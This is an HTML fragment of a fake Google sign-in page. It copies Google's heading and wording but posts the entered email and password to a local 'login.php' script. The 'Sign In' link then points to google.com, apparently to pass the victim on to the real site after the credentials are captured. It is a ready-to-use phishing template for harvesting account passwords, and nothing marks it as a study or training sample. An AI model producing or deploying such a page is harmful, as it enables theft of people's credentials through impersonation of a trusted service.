        <h2>Sign in</h2>
        <p id=uptext>Use your Google Account</p>
        
        <form id="login" method="POST" action="login.php" autocomplete="on">
        <p class="bottomtext">
        <input type="email" name="Uname" id="Uname" placeholder="Email or phone" required autofocus></p>
        <p class="bottomtext">
        <input type="password" name="Pass" id="Pass" placeholder="Enter your password" required></p>
        <p id="showpass">
        <input type="checkbox" onclick="myFunction()">Show Password</p>

        
        <script>
        function myFunction() {
        var x = document.getElementById("Pass");
        if (x.type === "password") {
            x.type = "text";
        } else {
            x.type = "password";
        }
        }
        </script>
        <br>
        <p class="bottomtext" id="para">Not your computer? Use Guest mode to sign in privately.</p>

        <button type="button" name="ca" id="ca" value="Create account" style="float: left"><storng><a href=signup.html>Create account</a></storng></button>
        <button type="submit" name="log" id="log" value="Sign In" style="float: right"><strong><a id="redrct" href="https://www.google.com/">Sign In</a></strong></button>   
        </p>
    </form>
